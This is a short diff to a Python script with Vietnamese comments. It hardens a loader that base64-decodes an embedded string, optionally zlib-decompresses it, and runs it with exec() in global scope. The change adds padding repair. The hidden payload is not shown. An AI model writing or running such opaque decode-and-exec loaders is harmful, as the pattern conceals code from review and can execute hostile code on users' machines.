@@ -10,16 +10,24 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 def _run():
     try:
+        # 1. Làm sạch khoảng trắng & xuống dòng
+        clean_code = _code.strip().replace("\n", "").replace(" ", "").replace("\r", "")
         
-        clean_code = _code.strip().replace("\n", "").replace(" ", "")
+        # 2. Tự động sửa lỗi Incorrect padding (thêm dấu '=' nếu thiếu)
+        missing_padding = len(clean_code) % 4
+        if missing_padding:
+            clean_code += '=' * (4 - missing_padding)
+            
+        # 3. Giải mã Base64
         decoded_bytes = base64.b64decode(clean_code)
         
-      
+        # 4. Giải nén zlib (nếu có)
         try:
             decompressed = zlib.decompress(decoded_bytes)
         except Exception:
             decompressed = decoded_bytes
             
+        # 5. Chạy code
         exec(decompressed.decode("utf-8"), globals())
     except Exception as e:
         print(f"[ERROR] Khong the giai ma code: {e}")
